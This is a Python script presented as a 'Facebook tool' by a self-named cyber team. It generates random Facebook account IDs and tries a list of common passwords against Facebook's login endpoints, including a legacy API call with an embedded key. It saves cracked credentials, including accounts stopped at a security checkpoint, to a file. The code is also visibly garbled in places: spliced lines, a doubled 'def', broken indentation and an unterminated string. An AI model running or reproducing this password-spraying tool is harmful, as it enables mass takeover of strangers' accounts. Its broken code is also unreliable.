# ====== RAJA VAU FACEBOOK TOOL v5.0 (2026 UPDATE) ======
# ====== SEND BY > RAJA VAU
# ====== TELEGRAM : RAJA VAU CYBER TEAM
# ====== UPDATED BY : RAJA VAU
# ====== VERSION : 5.0 - 2026 EDITION

import os, re, time, uuid, random, string, sys, json
import requests
import urllib.parse
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from datetime import datetime
import threading

# Auto install
modules = ['requests', 'urllib3', 'bs4', 'lxml', 'cryptography']
for module in modules:
    try:
        __import__(module)
    except ImportError:
        os.system(f'pip install {module} -q')

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ====== GLOBALS ======
oks = []
lock = threading.Lock()
checked_count = 0
start_time = None

# Colors
X = '\x1b[1;37m'
rad = '\x1b[38;5;196m'
G = '\x1b[38;5;46m'
Y = '\x1b[38;5;220m'
PP = '\x1b[38;5;203m'
W = '\x1b[1;37m'
C = '\x1b[38;5;51m'
M = '\x1b[38;5;201m'
B = '\x1b[38;5;27m'
P = '\x1b[38;5;200m'

OUTPUT_FILE = '/sdcard/SKOUTPUT_FILE = '/sdcard/RAJA-VAU-OK.txt'4-GALIB-OK.txt'

# ====== UPDATED PASSWORD LIST (2024-2029 accounts) ======
MODERN_PASSWORDS = [
    '123456', '1234567', '12345678', '123456789', '1234567890',
    '12345', '1234', '123', '123123', '123321', '123654',
    '000000', '00000000', '111111', '11111111', '112233',
    '121212', '123456a', '12345678a', '123456789a',
    '0123456', '0123456789', '12345678910',
    'password', 'pass123', 'Password', 'PASSWORD',
    'iloveyou', 'Iloveyou', 'loveyou', 'love123', 'lovely',
    'Facebook', 'facebook', 'facebook123', 'fb123',
    'bangladesh', 'bangla', 'dhaka', 'dhaka123',
    'sylhet', 'ctg', 'ctg123', 'bd2024', 'bd2025', 'bd2026',
    'bangladesh123', 'bangladesh2024',
    '2024', '2025', '2026', '2027', '2028', '2029',
    '20242024', '20252025', '20262026',
    'pass2024', 'pass2025', 'pass2026',
    'admin2024', 'admin2025', 'admin2026',
    'qwerty', 'qwerty123', 'qwerty12345',
    'asdfgh', 'zxcvbn', 'asdf1234', 'qwerty1',
    'abcdef', 'abcdef123', 'abc123', 'abcd1234',
    'monkey', 'master', 'dragon', 'shadow',
    'sunshine', 'princess', 'football', 'baseball',
    'welcome', 'Welcome', 'welcome123', 'welcome2024',
    'password1', 'password12', 'password123',
    'admin', 'Admin', 'admin123', 'administrator',
    'user', 'user123', 'user2024',
    'dhaka123', 'bangla123', 'desh123',
    'bD123456', 'BD123456', 'bangladesh',
    'sylhet123', 'ctg123', 'rangpur123',
    'hello', 'hello123', 'hi123', 'test',
    'test123', 'testing', 'demo', 'demo123',
    'nothing', 'bypass', 'secret', 'secret123',
    'changeme', 'default', 'default123',
    'access', 'access123', 'granted',
    'trustno1', 'letmein', 'letmein123',
    'whatever', 'whatever123', 'nobody',
    'nothing123', 'unknown', 'unknown123',
    '1q2w3e', '1q2w3e4r', '1qaz2wsx',
    'passionate', 'fuckyou', 'fuck123',
    'shit123', 'asshole', 'bitch123',
    '786786', '786786786', '111222', '222222',
    '333333', '444444', '555555', '666666',
    '777777', '888888', '999999',
    '112244', '113355', '224466', '336699',
    '102030', '203040', '405060', '506070',
    '100200', '200300', '300400', '400500',
    '147258', '258369', '369147',
    '159357', '357159', '951753',
    '123456789aA', '12345678Aa', 'Aa123456',
]

def def loading_animation(text="RAJAVAU", duration=3):
    frames = [
        f'{C}[{P}██▓▒░{C}] {W}{text}{X}',
        f'{C}[{P}░██▓▒░{C}] {W}{text}{X}',
        f'{C}[{P}░░██▓▒{C}] {W}{text}{X}',
        f'{C}[{P}▒░░██▓{C}] {W}{text}{X}',
        f'{C}[{P}▓▒░░██{C}] {W}{text}{X}',
        f'{C}[{P}█▓▒░░█{C}] {W}{text}{X}',
        f'{C}[{P}██▓▒░░{C}] {W}{text}{X}',
    ]
    end_time = time.time() + duration
    while time.time() < end_time:
        for frame in frames:
            sys.stdout.write(f'\r{frame}')
            sys.stdout.flush()
            time.sleep(0.08)
    sys.stdout.write('\r' + ' ' * 50 + '\r')
    sys.stdout.flush()

def progress_bar(current, total, bar_length=30):
    if total == 0:
        return
    fraction = current / total
    arrow = int(fraction * bar_length)
    spaces = bar_length - arrow
    percent = int(fraction * 100)
    elapsed = time.time() - start_time if start_time else 0
    rate = current / elapsed if elapsed > 0 else 0
    eta = (total - current) / rate if rate > 0 else 0
    
    bar = f'{G}█{X}' * arrow + f'{W}░{X}' * spaces
    sys.stdout.write(
        f'\r{C}[{bar}{C}] {Y}{percent}%{X} '
        f'{G}{current}/{total}{X} '
        f'{M}|{X} {C}OK:{G}{len(oks)}{X} '
        f'{M}|{X} {P}ETA:{Y}{eta:.0f}s{X}   '
    )
    sys.stdout.flush()

def linex():
    print(f'{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{X}')

def banner():
    os.system('cls' if 'win' in sys.platform else 'clear')
    print(f"""
{Y}+---------------------------------------------------+
{Y}| {P}  >>> RAJAVAU v4.0 - 2026 EDITION <<<           {Y}|
{Y}| {M}  >>> SEND BY : RajaVau <<<                     {Y}|
{Y}| {C}  >>> TEAM : RAJA VAU CYBER TEAM <<<            {Y}|
{Y}+---------------------------------------------------+
""")


──────────────────────────────────────────────────╯
def check_creation_year(uid):
    uid_str = str(uid).strip()
    length = len(uid_str)
    if length == 7:
        return '2004-2006'
    elif length == 8:
        return '2006-2007'
    elif length == 9:
        return '2008'
    elif length == 10:
        return '2008-2009'
    if length == 15:
        prefix_15 = uid_str[:7]
        try:
            prefix_num = int(prefix_15)
        except:
            return 'UNKNOWN'
        if 1000000 <= prefix_num <= 1000003:
            return '2009'
        elif 1000004 <= prefix_num <= 1000005:
            return '2010'
        elif 1000006 <= prefix_num <= 1000008:
            return '2010'
        elif 1000009 <= prefix_num <= 1000010:
            return '2011'
        elif 1000011 <= prefix_num <= 1000020:
            return '2012'
        elif 1000021 <= prefix_num <= 1000030:
            return '2013'
        elif 1000031 <= prefix_num <= 1000040:
            return '2014'
        elif 1000041 <= prefix_num <= 1000050:
            return '2015-2016'
        elif 1000051 <= prefix_num <= 1000060:
            return '2017-2018'
        elif 1000061 <= prefix_num <= 1000070:
            return '2019-2020'
        elif 1000071 <= prefix_num <= 1000080:
            return '2021-2022'
        elif 1000081 <= prefix_num <= 1000090:
            return '2023'
        elif 1000091 <= prefix_num <= 1000099:
            return '2024'
        else:
            return '2025+'
    elif length == 14:
        if uid_str.startswith('61'):
            return '2024-2025'
        elif uid_str.startswith('62'):
            return '2025-2026'
        elif uid_str.startswith('63'):
            return '2026'
        else:
            return '2024+'
    elif length == 16:
        return '2025-2029'
    return 'UNKNOWN'

def generate_ids(series_type, count):
    ids = []
    count = int(count)
    if series_type == 'all':
        for _ in range(count):
            r = rr(1, 100)
            if r <= 5:
                prefix = random.choice(['1000004', '1000005', '100001'])
                suffix = ''.join(random.choices('0123456789', k=9 - len(prefix)))
                ids.append(prefix + suffix)
            elif r <= 15:
                prefix = str(rr(100002, 100006))
                suffix = ''.join(random.choices('0123456789', k=9))
                ids.append(prefix + suffix)
            elif r <= 40:
                prefix = str(rr(100006, 100008))
                suffix = ''.join(random.choices('0123456789', k=8))
                ids.append(prefix + suffix)
            else:
                if rr(1, 100) <= 70:
                    ids.append('61' + ''.join(random.choices('0123456789', k=12)))
                else:
                    prefix = str(rr(1000085, 1000099))
                    suffix = ''.join(random.choices('0123456789', k=7))
                    ids.append(prefix + suffix)
    elif series_type == 'modern_2024':
        for _ in range(count):
            if rr(1, 100) <= 80:
                ids.append('61' + ''.join(random.choices('0123456789', k=12)))
            else:
                prefix = str(rr(1000090, 1000099))
                suffix = ''.join(random.choices('0123456789', k=7))
                ids.append(prefix + suffix)
    elif series_type == 'modern_2025':
        for _ in range(count):
            if rr(1, 100) <= 70:
                ids.append('62' + ''.join(random.choices('0123456789', k=12)))
            else:
                ids.append('63' + ''.join(random.choices('0123456789', k=12)))
    elif series_type == 'modern_2026_2029':
        for _ in range(count):
            if rr(1, 100) <= 60:
                ids.append('7' + ''.join(random.choices('0123456789', k=15)))
            else:
                ids.append('63' + ''.join(random.choices('0123456789', k=12)))
    elif series_type == 'bangladesh':
        for _ in range(count):
            ids.append('61' + ''.join(random.choices('0123456789', k=12)))
    elif series_type == 'series_100003':
        prefixes = ['100003', '100004']
        for _ in range(count):
            p = random.choice(prefixes)
            s = ''.join(random.choices('0123456789', k=9))
            ids.append(p + s)
    elif series_type == 'series_2009':
        for _ in range(count):
            ids.append('1000004' + ''.join(random.choices('0123456789', k=8)))
    seen = set()
    unique_ids = []
    for uid in ids:
        if uid not in seen:
            seen.add(uid)
            unique_ids.append(uid)
    return unique_ids

def get_initial_cookies_and_lsd(session):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.165 Mobile Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
        }
        resp = session.get(
            'https://www.facebook.com/login/',
            headers=headers,
            timeout=20,
            verify=False
        )
        lsd = ''
        patterns = [
            r'name="lsd"[^>]*value="([^"]+)"',
            r'"lsd":"([^"]+)"',
            r'name="lsd"[^>]*value=\'([^\']+)\'',
            r'lsd[^=]*=[^"]*"([^"]+)"',
        ]
        for pattern in patterns:
            match = re.search(pattern, resp.text)
            if match:
                lsd = match.group(1)
                break
        if not lsd:
            try:
                soup = BeautifulSoup(resp.text, 'html.parser')
                for script in soup.find_all('script'):
                    if script.string and 'LSD' in script.string:
                        m = re.search(r'"token":"([^"]+)"', script.string)
                        if m:
                            lsd = m.group(1)
                            break
            except:
                pass
        return lsd, resp.cookies.get_dict()
    except Exception:
        return '', {}

# ====================================================================
# ★★★ UPDATED BY: RAJA VAU CYBER TEAM ★★★
# ====================================================================
def try_login_real(uid, password, session):
    """
    REAL Facebook login via device-based endpoint.
    Returns: "OK" if login success, "OTP" if password correct but OTP/checkpoint needed, False otherwise.
    """
    try:
        lsd, cookies = get_initial_cookies_and_lsd(session)
        
        if not lsd:
            lsd = 'AVombCjH8Ro'
        
        login_data = {
            'lsd': lsd,
            'email': str(uid),
            'pass': password,
            'login': 'Log In',
            'login_source': 'comet_headerless',
            'next': '',
            'enc': '',
            'query_string': '',
            'dpr': '2',
            'flow': 'login_no_password',
            'prefill_contact_point': str(uid),
            'prefill_source': 'browser',
            'prefill_type': 'email_or_phone',
            'first_prefill': '1',
            'had_user_interaction': '1',
            'is_total_login': '0',
            'bi_xrnm': str(rr(100, 999)),
        }
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.165 Mobile Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.facebook.com',
            'Referer': 'https://www.facebook.com/login/',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Dest': 'document',
        }
        
        resp = session.post(
            'https://www.facebook.com/login/device-based/regular/login/',
            data=login_data,
            headers=headers,
            allow_redirects=False,
            timeout=20,
            verify=False
        )
        
        # ----- CHECK 1: FULL LOGIN SUCCESS (No OTP) -----
        if resp.status_code in (302, 303):
            location = resp.headers.get('Location', '')
            if 'login' not in location.lower() and 'checkpoint' not in location.lower():
                c_user = session.cookies.get('c_user')
                if c_user:
                    return "OK"
        
        if resp.status_code == 200:
            c_user = session.cookies.get('c_user')
            if c_user:
                return "OK"
            if 'home' in resp.url.lower() or 'feed' in resp.url.lower():
                return "OK"
        
        # ----- CHECK 2: OTP / CHECKPOINT DETECTION (Password is CORRECT!) -----
        # 2a: Redirect to checkpoint
        if resp.status_code in (302, 303):
            location = resp.headers.get('Location', '')
            if 'checkpoint' in location.lower():
                return "OTP"
        
        # 2b: Check response body for checkpoint indicators
        resp_text_lower = resp.text.lower()
        checkpoint_indicators = [
            'checkpoint', 'approvals_code', 'enter confirmation code',
            'two_factor', '2-factor', 'trusted_device', 'login_approval',
            'approvals', 'confirm identity', 'security code',
            'enter the code', 'code sent', 'otp',
            'authentication_required', 'security_checkpoint',
            'login_approvals', 'confirm_password_reset',
        ]
        for ind in checkpoint_indicators:
            if ind in resp_text_lower:
                return "OTP"
        
        # 2c: "We sent a code to" or similar patterns
        if re.search(r'(send|sent|enter).{0,30}(code|number|otp|pin)', resp_text_lower):
            return "OTP"
        
        return False
        
    except Exception:
        return False


def try_login_graph_api(uid, password, session):
    try:
        params = {
            'access_token': '237759909591655|0f140aabedfb65ac27a739ed1a2263b1',
            'format': 'json',
        }
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 Chrome/125.0.6422.165 Mobile Safari/537.36',
        }
        resp = session.get(
            f'https://graph.facebook.com/v25.0/{uid}',
            params=params,
            headers=headers,
            timeout=10,
            verify=False
        )
        data = resp.json()
        if 'id' in data and 'name' in data:
            return False
        return False
    except:
        return False


# =========================================================================
# ★★★ FIXED: check_account() - Now handles OK, OTP, and FAIL properly ★★★
# =========================================================================
def check_account(uid, password, method=1):
    """
    Check a single UID + password combination.
    Returns: True if hit (OK or OTP), False if failed.
    """
    global checked_count
    
    session = requests.Session()
    
    result = try_login_real(uid, password, session)
    
    # ----- CASE 1: FULL LOGIN SUCCESS -----
    if result == "OK":
        year = check_creation_year(uid)
        
        with lock:
            result_line = f'{uid}|{password}|REAL|{year}|{datetime.now().strftime("%Y-%m-%d %H:%M")}'
            with open(OUTPUT_FILE, 'a') as f:
                f.write(result_line + '\n')
            oks.append(uid)
        
        # ★ CUSTOM OUTPUT: OK format
        sys.stdout.write(f"\r\r\x1b[1;37m>\x1b[38;5;196m+\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37m🌏RBXRAJA-M1🧬\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;196m(\x1b[38;5;192m{checked_count}\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
        sys.stdout.flush()
        return True
    
    # ----- CASE 2: PASSWORD CORRECT BUT OTP/CHECKPOINT NEEDED -----
    elif result == "OTP":
        year = check_creation_year(uid)
        
        with lock:
            result_line = f'{uid}|{password}|OTP_REQUIRED|{year}|{datetime.now().strftime("%Y-%m-%d %H:%M")}'
            with open(OUTPUT_FILE, 'a') as f:
                f.write(result_line + '\n')
            oks.append(uid)
        
        # ★ CUSTOM OUTPUT: OTP format
        sys.stdout.write(f"\r\r\x1b[1;37m>\x1b[38;5;196m+\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37m🌏RBXRAJA-M1🧬\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;196m(\x1b[38;5;192m{checked_count}\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mOTP\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
        sys.stdout.flush()
        return True
    
    # ----- METHOD 2: Try old Graph API format (legacy) -----
    try:
        data = {
            'api_key': '882a8490361da98702bf97a021ddc14d',
            'credentials_type': 'password',
            'email': str(uid),
            'format': 'JSON',
            'generate_session_cookies': '1',
            'locale': 'en_US',
            'method': 'auth.login',
            'password': password,
            'return_ssl_resources': '0',
            'v': '1.0',
        }
        headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 14)'}
        res = session.get(
            'https://graph.facebook.com/v25.0/auth/login',
            params=data,
            headers=headers,
            timeout=10,
            verify=False
        )
        
        try:
            j = res.json()
            if 'session_key' in j or 'access_token' in j:
                year = check_creation_year(uid)
                
                with lock:
                    with open(OUTPUT_FILE, 'a') as f:
                        f.write(f'{uid}|{password}|API|{year}|{datetime.now().strftime("%Y-%m-%d %H:%M")}\n')
                    oks.append(uid)
                
                # ★ CUSTOM OUTPUT: API OK format
                sys.stdout.write(f"\r\r\x1b[1;37m>\x1b[38;5;196m+\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37m🌏RBXRAJA-M1🧬\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;196m(\x1b[38;5;192m{checked_count}\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
                sys.stdout.flush()
                return True
        except:
            pass
    except:
        pass
    
    # ----- FAILED: Update counter -----
    with lock:
        checked_count += 1
    
    return False


def worker_task(uid, passwords, method):
    for pw in passwords:
        if check_account(uid, pw, method):
            return True
    return False


def main_menu():
    global start_time
    
    banner()
    loading_animation("RAJA VAU INITIALIZING", 2)
    
    print(f'\n{Y}            ╔══════════════════════════════════════════╗')
    print(f'          {C}RAJA VAU v4.0 - 2026 EDITION')
    print(f'            ╚══════════════════════════════════════════╝{X}')
    linex()
    print(f'{C}   (A) {W}ALL IN ONE - MIX ALL SERIES (60% Modern 2024-2029){X}')
    print(f'{C}   (B) {W}100003/100004 SERIES (2011-2012 OLD ACCOUNTS){X}')
    print(f'{C}   (C) {W}2009 SERIES (VERY OLD ACCOUNTS){X}')
    print(f'{C}   (D) {W}2024-2025 SERIES (61 PREFIX - MODERN){X}')
    print(f'{C}   (E) {W}2025-2026 SERIES (62-63 PREFIX - NEWEST){X}')
    print(f'{C}   (F) {W}2026-2029 SERIES (7x - FUTURE ACCOUNTS){X}')
    print(f'{C}   (G) {W}BANGLADESH ONLY (61 SERIES){X}')
    print(f'{C}   (H) {W}CUSTOM YEAR RANGE (INPUT MANUAL){X}')
    linex()
    linex()
choice = input(f'{Y} [★] SELECT [A-H]: ')
linex()

count = input(f'{Y} [★] ENTER TOTAL ID LIMIT: ')
linex()
    print(f'{C}   (A) {W}METHOD 1 - REAL FACEBOOK LOGIN (2026 Updated){X}')
    print(f'{C}   (B) {W}METHOD 2 - SINGLE PASSWORD FAST SCAN{X}')
    print(f'{C}   (C) {W}METHOD 3 - HYBRID (Both methods){X}')
    linex()
    method_choice = input(f'{Y}   [★] CHOOSE METHOD [A/B/C] : {C}').strip().lower()
    linex()
    
    series_map = {
        'a': 'all', 'b': 'series_100003', 'c': 'series_2009',
        'd': 'modern_2024', 'e': 'modern_2025',
        'f': 'modern_2026_2029', 'g': 'bangladesh'
    }
    series_type = series_map.get(choice, 'all')
    
    if choice == 'h':
        linex()
        year_from = input(f'{Y} [★] START YEAR (2024-2029): ')
year_to = input(f'{Y} [★] END YEAR (2024-2029): ')
        series_type = f'custom_{year_from}_{year_to}'
    
    banner()
    loading_animation("SK4 GALIB ACTIVATING ENGINE", 2)
    
    print(f'{G}       [✓] SK4 GALIB TOOL ACTIVATED{X}')
    print(f'{Y}       [★] TOTAL IDs: {G}{count}')
    print(f'{Y}       [★] VERSION:  {G}4.0 (2026 EDITION){X}')
    print(f'{Y}       [★] OUTPUT:   {G}{OUTPUT_FILE}{X}')
    linex()
    print(f'{C}       [✓] AIRPLANE MODE ON → BETTER RESULTS{X}')
    print(f'{C}       [✓] CLOSE OTHER INTERNET APPS{X}')
    print(f'{C}       [✓] USE VPN IF NEEDED{X}')
    linex()
    time.sleep(1)
    
    loading_animation("GENERATING TARGET IDs", 1.5)
    user_ids = generate_ids(series_type, count)
    actual_count = len(user_ids)
    print(f'{G}       [✓] Generated {actual_count} unique IDs{X}')
    linex()
    time.sleep(0.5)
    
    start_time = time.time()
    
    if method_choice == 'b':
        pwd = input(f'{Y}   [★] ENTER PASSWORD TO TEST : {C}').strip()
        passwords_to_try = [pwd]
    else:
        passwords_to_try = MODERN_PASSWORDS
    
    batch_size = 5
    
    print(f'{C}       [★] SCANNING STARTED...{X}')
    linex()
    time.sleep(0.5)
    
    with tred(max_workers=30) as pool:
        futures = []
        for uid in user_ids:
            pw_batches = [passwords_to_try[i:i+batch_size]
                         for i in range(0, len(passwords_to_try), batch_size)]
            for batch in pw_batches:
                if method_choice in ('a', 'c'):
                    futures.append(pool.submit(worker_task, uid, batch, 1))
                if method_choice in ('b', 'c'):
                    futures.append(pool.submit(worker_task, uid, batch, 2))
        
        total_tasks = len(futures)
        completed = 0
        while completed < total_tasks:
            completed = sum(1 for f in futures if f.done())
            progress_bar(completed, total_tasks)
            time.sleep(0.5)
    
    linex()
    elapsed = time.time() - start_time
    print(f'\n{G}╔══════════════════════════════════════════════════════╗')
    print(f'|| {C}RAJA VAU SCAN COMPLETE!
    print(f'║                                              {G}║')
    print(f'║  {Y}Total IDs Checked : {G}{actual_count}                   {G}║')
    print(f'║  {Y}Passwords Tested : {G}{len(passwords_to_try)}                   {G}║')
    print(f'║  {Y}Accounts Found   : {G}{len(oks)}                   {G}║')
    print(f'║  {Y}Time Elapsed     : {G}{elapsed:.1f}s                   {G}║')
    print(f'║  {Y}Output File      : {G}{OUTPUT_FILE}  {G}║')
    print(f'╚══════════════════════════════════════════════════════╝{X}')
    linex()
    
    input(f'\n{G}[✔] RAJA VAU TOOL FINISHED. PRESS ENTER TO EXIT...{X}')


if __name__ == '__main__':
    try:
        main_menu()
    except KeyboardInterrupt:
        print(f'\n{rad}[!] RAJA VAU TOOL CLOSED BY USER')
        sys.exit(0)
    except Exception as e:
        print(f'{rad}[!] ERROR: {e}{X}')
        sys.exit(1)
